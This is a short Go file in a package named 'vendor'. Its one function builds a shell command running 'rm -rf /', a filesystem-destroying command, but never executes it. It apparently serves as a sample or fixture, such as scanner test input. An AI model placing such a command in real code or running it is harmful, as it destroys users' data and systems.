package vendor

import "os/exec"

func run() {
	exec.Command("sh", "-c", "rm -rf /")
}
